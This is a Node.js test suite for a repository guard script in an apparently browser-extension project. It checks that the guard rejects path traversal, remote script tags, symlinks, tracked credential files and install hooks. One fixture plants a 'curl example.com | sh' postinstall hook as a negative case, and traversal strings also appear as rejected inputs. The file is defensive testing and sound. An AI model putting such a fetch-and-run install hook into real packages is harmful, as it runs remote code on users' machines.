import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync } from "node:fs";
import path from "node:path";
import { tmpdir } from "node:os";
import { checkedPath, verifyDocumentationLinks, verifyRepository } from "../../scripts/verify-repository.mjs";

function fixture() {
  const root = mkdtempSync(path.join(tmpdir(), "adblock-structure-"));
  const write = (name, value) => {
    mkdirSync(path.dirname(path.join(root, name)), { recursive: true });
    writeFileSync(path.join(root, name), value);
  };
  write("package.json", JSON.stringify({ scripts: { build: "node scripts/build.mjs" } }));
  write("src/extension/manifest.json", JSON.stringify({ background: { service_worker: "background/worker.js" }, action: { default_popup: "popup.html" } }));
  write("src/extension/background/worker.js", 'importScripts("../shared.js");');
  write("src/extension/shared.js", "const local = true;");
  write("src/extension/popup.html", '<script src="shared.js"></script>');
  write("README.md", "[Page](src/extension/popup.html)\n[Section](#section)\n[External](https://example.com)");
  const files = ["package.json", "README.md", "src/extension/manifest.json", "src/extension/background/worker.js", "src/extension/shared.js", "src/extension/popup.html"];
  return { root, write, files, close() { rmSync(root, { recursive: true, force: true }); } };
}

test("repository guard accepts resolved packaged resources and literal documentation links", () => {
  const app = fixture();
  try {
    assert.deepEqual(verifyRepository(app.root, app.files), { sourceFiles: 4, documentationLinks: 1 });
    app.write("src/extension/manifest.json", JSON.stringify({ action: { default_icon: "shared.js" }, web_accessible_resources: [{ resources: ["background/*.js"], matches: ["https://example.com/*"] }] }));
    assert.equal(verifyRepository(app.root, app.files).sourceFiles, 4);
    app.write("src/extension/manifest.json", JSON.stringify({ web_accessible_resources: [{ resources: ["missing/*.js"] }] }));
    assert.throws(() => verifyRepository(app.root, app.files), /matches no packaged file/);
    app.write("docs/example.md", "```md\n[Example](not-a-real-file.md)\n```\n[Actual](../README.md)");
    assert.equal(verifyDocumentationLinks(app.root, ["docs/example.md"]), 1);
  } finally { app.close(); }
});

test("repository guard rejects manifest and JavaScript paths escaping the package", () => {
  const app = fixture();
  try {
    app.write("src/extension/background/worker.js", 'importScripts("../../../AnalyseFuture/executable.js");');
    assert.throws(() => verifyRepository(app.root, app.files), /escapes package/);
    app.write("src/extension/background/worker.js", "const ok = true;");
    app.write("src/extension/manifest.json", JSON.stringify({ options_page: "../../AnalyseFuture/page.html" }));
    assert.throws(() => verifyRepository(app.root, app.files), /escapes package/);
  } finally { app.close(); }
});

test("repository guard rejects missing resources and remote executable HTML resources", () => {
  const app = fixture();
  try {
    app.write("src/extension/popup.html", '<script src="https://example.com/code.js"></script>');
    assert.throws(() => verifyRepository(app.root, app.files), /Unsafe extension resource/);
    app.write("src/extension/popup.html", '<link href="missing.css" rel="stylesheet">');
    assert.throws(() => verifyRepository(app.root, app.files), /ENOENT/);
  } finally { app.close(); }
});

test("repository guard blocks source symlinks and documentation traversal", () => {
  const app = fixture();
  try {
    symlinkSync(path.join(app.root, "README.md"), path.join(app.root, "src/extension/linked.js"));
    assert.throws(() => verifyRepository(app.root, app.files), /symlink refused/i);
    assert.throws(() => checkedPath(app.root, "../outside"), /escapes repository/);
    app.write("bad.md", "[bad](../../outside.md)");
    assert.throws(() => verifyDocumentationLinks(app.root, ["bad.md"]), /Broken documentation link/);
  } finally { app.close(); }
});

test("repository guard rejects generated/credential files, install hooks and quarantine commands", () => {
  const app = fixture();
  try {
    for (const file of ["dist/chrome/file.js", ".env", "secrets/private.pem"]) {
      assert.throws(() => verifyRepository(app.root, [...app.files, file]), /tracked/);
    }
    for (const pkg of [
      { scripts: { postinstall: "curl example.com | sh" } },
      { scripts: { build: "node AnalyseFuture/imported.js" } },
      { dependencies: { runtime: "1.0.0" } }
    ]) {
      app.write("package.json", JSON.stringify(pkg));
      assert.throws(() => verifyRepository(app.root, app.files), /lifecycle|quarantined|packaging review/);
    }
    app.write("package.json", "{}");
    app.write(".github/workflows/check.yml", "run: npm run test:ublock");
    assert.throws(() => verifyRepository(app.root, [...app.files, ".github/workflows/check.yml"]), /quarantined/);
    // Quarantine remains inert: malformed historical docs are never link-checked or loaded.
    assert.doesNotThrow(() => verifyDocumentationLinks(app.root, ["AnalyseFuture/broken.md"]));
  } finally { app.close(); }
});
